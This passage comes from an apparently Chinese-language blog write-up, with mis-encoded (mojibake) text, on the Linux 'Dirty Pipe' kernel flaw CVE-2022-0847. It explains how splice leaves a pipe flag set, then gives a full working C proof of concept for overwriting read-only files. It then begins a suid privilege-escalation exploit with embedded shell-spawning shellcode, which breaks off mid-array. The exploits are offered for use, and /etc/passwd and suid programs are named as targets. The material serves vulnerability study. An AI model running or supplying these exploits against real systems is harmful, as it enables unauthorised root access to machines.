<code>ext4_file_write_iter</code>ï¼Œè¿™é‡Œæœ€ç»ˆåªæ˜¯å¸¸è§„çš„å°† buf ä¸Šæ•°æ®æ‹·è´åˆ°æ–‡ä»¶ä¸Šçš„æ“ä½œï¼Œä¹Ÿå¹¶éæœ¬ç¯‡çš„é‡ç‚¹ï¼Œå°±ä¸å±•å¼€åˆ†æäº†</p><h1>0x01.æ¼æ´åˆ†æ</h1><p>æˆ‘ä»¬å’‹ä¸€çœ‹å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†è®©æˆ‘ä»¬æ€è€ƒè¿™æ ·ä¸€ä¸ªæƒ…æ™¯ï¼š</p><ul><li>æˆ‘ä»¬å°†ç®¡é“æ•´ä¸ªè¯»å†™äº†ä¸€è½®ï¼Œæ­¤æ—¶æ‰€æœ‰çš„ pipe_buffer éƒ½ä¿ç•™äº† <code>PIPE_BUF_FLAG_CAN_MERGE</code> æ ‡å¿—ä½</li><li>æˆ‘ä»¬åˆ©ç”¨ splice å°†æ•°æ®ä»æ–‡ä»¶è¯»å–ä¸€ä¸ªå­—èŠ‚åˆ°ç®¡é“ä¸Šï¼Œæ­¤æ—¶ pipe_buffer å¯¹åº”çš„ page æˆå‘˜<strong>æŒ‡å‘æ–‡ä»¶æ˜ å°„çš„é¡µé¢</strong>ï¼Œä½†åœ¨ splice ä¸­<strong>å¹¶æœªæ¸…ç©º pipe_buffer çš„æ ‡å¿—ä½ï¼Œä»è€Œè®©å†…æ ¸è¯¯ä»¥ä¸ºè¯¥é¡µé¢å¯ä»¥è¢«å†™å…¥</strong></li><li>åœ¨ splice ä¸­å»ºç«‹å®Œé¡µé¢æ˜ å°„åï¼Œæ­¤æ—¶ head ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª pipe_bufferï¼Œæ­¤æ—¶æˆ‘ä»¬å†å‘ç®¡é“ä¸­å†™å…¥æ•°æ®ï¼Œç®¡é“è®¡æ•°å™¨ä¼šå‘ç°ä¸Šä¸€ä¸ª pipe_buffer æ²¡æœ‰å†™æ»¡ï¼Œä»è€Œ<strong>å°†æ•°æ®æ‹·è´åˆ°ä¸Šä¸€ä¸ª pipe_buffer å¯¹åº”çš„é¡µé¢â€”â€”å³æ–‡ä»¶æ˜ å°„çš„é¡µé¢</strong>ï¼Œç”±äº <code>PIPE_BUF_FLAG_CAN_MERGE</code> ä»ä¿ç•™ç€ï¼Œå› æ­¤<strong>å†…æ ¸ä¼šè¯¯ä»¥ä¸ºè¯¥é¡µé¢å¯ä»¥è¢«å†™å…¥</strong>ï¼Œä»è€Œå®Œæˆäº†è¶Šæƒå†™å…¥æ–‡ä»¶çš„æ“ä½œ</li></ul><p>æ¼æ´ç‚¹ä¾¿æ˜¯åœ¨äº splice ç³»ç»Ÿè°ƒç”¨ä¸­<strong>æœªæ¸…ç©º</strong> <code>pipe_buffer</code> <strong>çš„æ ‡å¿—ä½ï¼Œä»è€Œå°†ç®¡é“é¡µé¢å¯å†™å…¥çš„çŠ¶æ€ä¿ç•™äº†ä¸‹æ¥</strong>ï¼Œè¿™ç»™äº†æˆ‘ä»¬è¶Šæƒå†™å…¥åªè¯»æ–‡ä»¶çš„æ“ä½œ</p><p>æˆ‘ä»¬ä¸éš¾å‘ç°è¿™ä¸ªæ¼æ´ä¸è„ç‰›ååˆ†ç±»ä¼¼ï¼Œéƒ½æ˜¯èƒ½è¶Šæƒå¯¹æ–‡ä»¶è¿›è¡Œå†™å…¥ï¼Œä¸åŒçš„æ˜¯è„ç‰›éœ€è¦å»æ’æ¡ä»¶ç«äº‰çš„æ¦‚ç‡ï¼Œè€Œè¯¥æ¼æ´<strong>å¯ä»¥ç¨³å®šè§¦å‘</strong>ï¼Œä½†æ˜¯è„ç‰›å¯ä»¥ç›´æ¥å†™æ•´ä¸ªæ–‡ä»¶ï¼Œè€Œ<strong>è¯¥æ¼æ´ä¸èƒ½åœ¨ç®¡é“è¾¹ç•Œä¸Šå†™å…¥</strong></p><blockquote><p>å½“ç„¶ï¼Œå¦‚æœè¿™ä¸ªæ–‡ä»¶ç”šè‡³éƒ½æ˜¯ä¸å¯è¯»çš„ï¼Œé‚£è‡ªç„¶æ˜¯æ²¡æ³•åˆ©ç”¨çš„ï¼ˆç¬‘ï¼‰ï¼Œä½†åœ¨ä¸»æµ Linux å‘è¡Œç‰ˆä¸­æœ‰ç€å¤§é‡çš„å¯ä½œä¸ºæˆ‘ä»¬æ”»å‡»ç›®æ ‡çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ suid ç¨‹åºæˆ– <code>/etc/passwd</code> ç­‰</p></blockquote><h1>0x02.æ¼æ´åˆ©ç”¨</h1><p>æ¼æ´åˆ©ç”¨çš„æ­¥éª¤å…¶å®æˆ‘ä»¬åœ¨å‰é¢éƒ½å·²ç»å™è¿°å¾—å·®ä¸å¤šäº†ï¼Œä¸»è¦å°±æ˜¯åˆ†ä¸‰æ­¥èµ°ï¼š</p><h2 id="Step-I-å†™ã€è¯»ç®¡é“ï¼Œè®¾ç½®-PIPE-BUF-FLAG-CAN-MERGE-flag">Step.I å†™ã€è¯»ç®¡é“ï¼Œè®¾ç½® PIPE_BUF_FLAG_CAN_MERGE flag</h2><p>ä¸ºäº†ä¿è¯åˆ©ç”¨èƒ½å¤Ÿç¨³å®šæˆåŠŸï¼Œæˆ‘ä»¬é¦–å…ˆæ–°å»ºä¸€ä¸ªç®¡é“ï¼Œ<strong>å°†ç®¡é“å†™æ»¡åå†å°†æ‰€æœ‰æ•°æ®è¯»å‡º</strong>ï¼Œè¿™æ ·ç®¡é“çš„æ¯ä¸€ä¸ª <code>pipe_buffer</code> éƒ½ä¼šè¢«è®¾ç½®ä¸Š  <code>PIPE_BUF_FLAG_CAN_MERGE</code> æ ‡å¿—ä½</p><h2 id="Step-II-splice-å»ºç«‹-pipe-buffer-ä¸æ–‡ä»¶çš„å…³è”ï¼ˆæ¼æ´äº§ç”Ÿç‚¹ï¼‰">Step.II splice å»ºç«‹ pipe_buffer ä¸æ–‡ä»¶çš„å…³è”ï¼ˆæ¼æ´äº§ç”Ÿç‚¹ï¼‰</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ splice ç³»ç»Ÿè°ƒç”¨å°†æ•°æ®ä»ç›®æ ‡æ–‡ä»¶ä¸­è¯»å…¥åˆ°ç®¡é“ï¼Œä»è€Œè®© <code>pipe_buffer-&gt;page</code> å˜ä¸ºæ–‡ä»¶åœ¨å†…å­˜ä¸­æ˜ å°„çš„é¡µé¢ï¼Œä¸ºäº†è®©ä¸‹ä¸€æ¬¡å†™å…¥æ•°æ®æ—¶å†™å›æ–‡ä»¶æ˜ å°„çš„é¡µé¢ï¼Œæˆ‘ä»¬åº”å½“<strong>è¯»å…¥ä¸å¤šäºä¸€ä¸ªæ•°æ®çš„é¡µé¢</strong>ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©è¯»å…¥ 1 ä¸ªå­—èŠ‚ï¼Œè¿™æ ·æˆ‘ä»¬ä»èƒ½å‘æ–‡ä»¶ä¸Šå†™å…¥å°†è¿‘ä¸€å¼ é¡µé¢çš„æ•°æ®</p><p>å½“æˆ‘ä»¬å®Œæˆè¯»å…¥ä¹‹åï¼Œç®¡é“çš„ head æŒ‡å‘ä¸‹ä¸€ä¸ª pipe_bufferï¼Œå› æ­¤æˆ‘ä»¬è‹¥è¦å†™å…¥æ–‡ä»¶åˆ™åº”å½“èµ°å…¥åˆ° pipe_write å¼€å¤´å†™å…¥ä¸Šä¸€ä¸ª pipe_buffer çš„åˆ†æ”¯ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨è¿™é‡Œåªè¯»å…¥ä¸€ä¸ªå­—èŠ‚çš„ç¼˜æ•…</p><h2 id="Step-III-å‘ç®¡é“ä¸­å†™å…¥æ¶æ„æ•°æ®ï¼Œå®Œæˆè¶Šæƒå†™å…¥æ–‡ä»¶">Step.III å‘ç®¡é“ä¸­å†™å…¥æ¶æ„æ•°æ®ï¼Œå®Œæˆè¶Šæƒå†™å…¥æ–‡ä»¶</h2><p>æ¥ä¸‹æ¥<strong>æˆ‘ä»¬ç›´æ¥å‘ç®¡é“ä¸­å†™å…¥æ•°æ®å°±èƒ½å®Œæˆå¯¹åªè¯»æ–‡ä»¶çš„è¶Šæƒå†™å…¥</strong>ã€‚åœ¨ splice ä¸­å»ºç«‹å®Œé¡µé¢æ˜ å°„åï¼Œæ­¤æ—¶ head ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª pipe_bufferï¼Œæ­¤æ—¶æˆ‘ä»¬å†å‘ç®¡é“ä¸­å†™å…¥æ•°æ®ï¼Œç®¡é“è®¡æ•°å™¨ä¼šå‘ç°ä¸Šä¸€ä¸ª pipe_buffer æ²¡æœ‰å†™æ»¡ï¼Œä»è€Œ<strong>å°†æ•°æ®æ‹·è´åˆ°ä¸Šä¸€ä¸ª pipe_buffer å¯¹åº”çš„é¡µé¢â€”â€”å³æ–‡ä»¶æ˜ å°„çš„é¡µé¢</strong>ï¼Œç”±äº <code>PIPE_BUF_FLAG_CAN_MERGE</code> ä»ä¿ç•™ç€ï¼Œå› æ­¤<strong>å†…æ ¸ä¼šè¯¯ä»¥ä¸ºè¯¥é¡µé¢å¯ä»¥è¢«å†™å…¥</strong>ï¼Œä»è€Œå®Œæˆäº†è¶Šæƒå†™å…¥æ–‡ä»¶çš„æ“ä½œ</p><h2 id="poc">poc</h2><p>æˆ‘ä»¬ä½¿ç”¨ qemu èµ·ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œçœ‹çœ‹æ˜¯å¦èƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´å¯¹åªè¯»æ–‡ä»¶è¿›è¡Œå†™å…¥ï¼Œæœ€ç»ˆçš„ poc å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * POC of CVE-2022-0847</span><br><span class="hljs-comment"> * written by arttnba3</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br><span class="hljs-type">long</span>page_size;<br><span class="hljs-type">size_t</span>offset_in_file;<br><span class="hljs-type">size_t</span> data_size;<br><span class="hljs-type">int</span> target_file_fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">target_file_stat</span>;</span><br><span class="hljs-type">int</span>pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> pipe_size;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">int</span> retval;<br><br><span class="hljs-comment">// checking before we start to exploit</span><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">4</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Usage: ./exp target_file offset_in_file data&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br>page_size = sysconf(_SC_PAGE_SIZE);<br>offset_in_file = strtoul(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (offset_in_file % page_size == <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Cannot write on the boundary of a page!&quot;</span>);<br><br>target_file_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br><span class="hljs-keyword">if</span> (target_file_fd &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Failed to open the target file!&quot;</span>);<br><br><span class="hljs-keyword">if</span> (fstat(target_file_fd, &amp;target_file_stat))<br>errExit(<span class="hljs-string">&quot;Failed to get the info of the target file!&quot;</span>);<br><br><span class="hljs-keyword">if</span> (offset_in_file &gt; target_file_stat.st_size)<br>errExit(<span class="hljs-string">&quot;Offset is not in the file!&quot;</span>);<br><br>data_size = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">3</span>]);<br><span class="hljs-keyword">if</span> ((offset_in_file + data_size) &gt; target_file_stat.st_size)<br>errExit(<span class="hljs-string">&quot;Cannot enlarge the file!&quot;</span>);<br><br><span class="hljs-keyword">if</span> (((offset_in_file % page_size) + data_size) &gt; page_size)<br>errExit(<span class="hljs-string">&quot;Cannot write accross a page!&quot;</span>);<br><br><span class="hljs-comment">// exploit now...</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span><br><span class="hljs-comment"> * Just write and read through</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);<br>pipe(pipe_fd);<br>pipe_size = fcntl(pipe_fd[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>buffer = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(page_size);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;<br>size_left -= write(pipe_fd[<span class="hljs-number">1</span>], buffer, per_write);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;<br>size_left -= read(pipe_fd[<span class="hljs-number">0</span>], buffer, per_read);<br>&#125;<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Use the splice to make the pipe_buffer-&gt;page</span><br><span class="hljs-comment"> * become the page of the file mapped, by read</span><br><span class="hljs-comment"> * a byte from the file accross the splice</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);<br>offset_in_file--;<span class="hljs-comment">// we read a byte, so offset should minus 1</span><br>retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;splice failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval == <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;short splice!&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Now it comes to the time of exploit:</span><br><span class="hljs-comment"> * the mapped page of file has been in pipe_buffer,</span><br><span class="hljs-comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span><br><span class="hljs-comment"> * just a simple write can make the exploit.</span><br><span class="hljs-comment"> */</span><br>retval = write(pipe_fd[<span class="hljs-number">1</span>], argv[<span class="hljs-number">3</span>], data_size);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Write failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval &lt; data_size)<br>errExit(<span class="hljs-string">&quot;Short write!&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼Œå‘ç°æˆ‘ä»¬æˆåŠŸåœ°è¦†å†™äº†åªè¯»æ–‡ä»¶</p><p><img src="https://s2.loli.net/2022/03/12/vOGZw2Qt9VRsYDd.png" alt="image.png"></p><h1>0x03.ææƒ</h1><p>æ¼æ´çš„åˆ©ç”¨å½¢å¼ä¸â€œè„ç‰›â€åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ï¼šè¦†å†™ <code>/etc/passwd</code> æˆ–è€…è¦†å†™ä¸€äº› suid ç¨‹åºè¿›è¡Œææƒï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šèµ˜å™äº†</p><h2 id="suid-ææƒ">suid ææƒ</h2><p>ç¬”è€…ç°ç»™å‡ºä¸€ä¸ªä¿®æ”¹æŒ‡å®š suid ç¨‹åºè¿›è¡Œææƒçš„ expï¼Œä½¿ç”¨ msfvenom ç”Ÿæˆè¿è¡Œ <code>/bin/sh</code> çš„ shellcodeï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * exploit of CVE-2022-0847</span><br><span class="hljs-comment"> * written by arttnba3</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = &#123;<br>    <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x95</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>,<br>    <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5f</span>, <span 